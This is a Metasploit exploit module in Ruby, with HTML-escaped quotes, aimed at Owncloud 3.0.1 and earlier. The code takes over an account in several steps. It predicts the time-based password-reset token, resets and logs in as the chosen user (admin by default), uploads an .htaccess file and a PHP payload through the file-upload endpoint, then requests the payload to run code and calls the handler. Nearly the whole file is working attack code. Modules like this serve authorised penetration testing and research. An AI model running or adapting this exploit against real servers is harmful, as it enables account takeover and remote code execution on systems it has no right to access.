# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
# http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
Rank = ExcellentRanking

include Msf::Exploit::Remote::HttpClient

def initialize(info = {})
super(update_info(info,
&#039;Name&#039; => &#039;Owncloud Account Overtake, File Upload Code Execution&#039;,
&#039;Description&#039; => %q{
This module exploits several vulnerabilities in Owncloud 3.0.1 and earlier in order to achieve code execution.
},
&#039;Author&#039; => [ &#039;Lukas Kupczyk luks[at]sploit.de&#039; ],
&#039;License&#039; => MSF_LICENSE,
&#039;Version&#039; => &#039;&#039;,
&#039;References&#039; =>
[
],
&#039;Privileged&#039; => false,
&#039;Payload&#039; =>
{
&#039;DisableNops&#039; => true,
&#039;Compat&#039; =>
{
&#039;ConnectionType&#039; => &#039;find&#039;,
},
&#039;Space&#039; => 8000
},
&#039;Platform&#039; => &#039;php&#039;,
&#039;Arch&#039; => ARCH_PHP,
&#039;Targets&#039; => [[ &#039;Automatic&#039;, { }]],
&#039;DisclosureDate&#039; => &#039;&#039;,
&#039;DefaultTarget&#039; => 0))

register_options(
[
OptString.new(&#039;URI&#039;, [true, "Owncloud directory path", "/owncloud"]),
OptString.new(&#039;USERNAME&#039;, [true, "The username to authenticate as", "admin"]),
OptString.new(&#039;PASSWORD&#039;, [true, "New password", "metasploit"]),
], self.class)
end

def password_reset
res = send_request_cgi({
&#039;uri&#039; => "#{datastore[&#039;URI&#039;]}/core/lostpassword/index.php",
&#039;method&#039; => &#039;POST&#039;,
&#039;data&#039; => &#039;user=&#039; + datastore[&#039;USERNAME&#039;],
})

if res.body =~ /Requested/
print_status("Triggered password reset")
else
raise RuntimeError, "Error: could not trigger password reset, does the user #{datastore[&#039;USERNAME&#039;]}
exist?"
end
end

def set_new_password(token)
res = send_request_cgi({
&#039;uri&#039; =>
"#{datastore[&#039;URI&#039;]}/core/lostpassword/resetpassword.php?user=#{datastore[&#039;USERNAME&#039;]}&token=#{token}",
&#039;method&#039; => &#039;POST&#039;,
&#039;data&#039; => "password=#{datastore[&#039;PASSWORD&#039;]}"
})

if res.body =~ /Your password was reset/
print_status("New password set")
else
raise RuntimeError, "Error: Could not set new password"
end
end

def gen_token
require &#039;digest/sha1&#039;
uniqid = Time.now.to_i.to_s(16)
Digest::SHA1.hexdigest((datastore[&#039;USERNAME&#039;].to_i + uniqid.to_i).to_s)
end

def login
res = send_request_cgi({
&#039;uri&#039; => "#{datastore[&#039;URI&#039;]}/index.php",
&#039;method&#039; => &#039;POST&#039;,
&#039;data&#039; => "user=#{datastore[&#039;USERNAME&#039;]}&password=#{datastore[&#039;PASSWORD&#039;]}",
})

if not res["Set-Cookie"]
raise RuntimeError, "Error: Login failed"
else
print_status("Logged in as #{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]}")
return res["Set-Cookie"]
end
end

def upload(cookie, cmdscript)
boundary = rand_text_alphanumeric(6)

data = "--#{boundary}\r\nContent-Disposition: form-data; name=\"Filename\"\r\n\r\n"
data << ".htaccess\r\n--#{boundary}"
data << "\r\nContent-Disposition: form-data; name=\"files[]\";
filename=\".htaccess\"\r\n"
data << "Content-Type: application/octet-stream\r\n\r\n"
data << "allow from all"
data << "\r\n--#{boundary}--"

print_status("Uploading .htaccess")
res = send_request_raw({
&#039;uri&#039; => "#{datastore[&#039;URI&#039;]}/files/ajax/upload.php",
&#039;method&#039; => &#039;POST&#039;,
&#039;data&#039; => data,
&#039;cookie&#039; => cookie,
&#039;headers&#039; =>
{
&#039;Content-Length&#039; => data.length,
&#039;Content-Type&#039; => &#039;multipart/form-data; boundary=&#039; + boundary,
}
})

if res.code != 200
print_error("Server returned non-200 status code (#{res.code})")
end

cmd_php = &#039;<?php &#039; + payload.encoded + &#039;?>&#039;

data = "--#{boundary}\r\nContent-Disposition: form-data; name=\"Filename\"\r\n\r\n"
data << "#{cmdscript}.php\r\n--#{boundary}"
data << "\r\nContent-Disposition: form-data; name=\"files[]\";
filename=\"#{cmdscript}.php\"\r\n"
data << "Content-Type: application/octet-stream\r\n\r\n"
data << cmd_php
data << "\r\n--#{boundary}--"

print_status("Uploading payload")
res = send_request_raw({
&#039;uri&#039; => "#{datastore[&#039;URI&#039;]}/files/ajax/upload.php",
&#039;method&#039; => &#039;POST&#039;,
&#039;data&#039; => data,
&#039;cookie&#039; => cookie,
&#039;headers&#039; =>
{
&#039;Content-Length&#039; => data.length,
&#039;Content-Type&#039; => &#039;multipart/form-data; boundary=&#039; + boundary,
}
})

if res.code != 200
print_error("Server returned non-200 status code (#{res.code})")
end
end

def exploit
token = gen_token()
print_status("Generated token: #{token}")

password_reset()

set_new_password(token)

cookie = login()

cmdscript = rand_text_alpha_lower(20)
upload(cookie, cmdscript)

# execute our payload
res = send_request_raw({
&#039;uri&#039; => "#{datastore[&#039;URI&#039;]}/data/#{datastore[&#039;USERNAME&#039;]}/files/#{cmdscript}.php",
})

handler
end

end



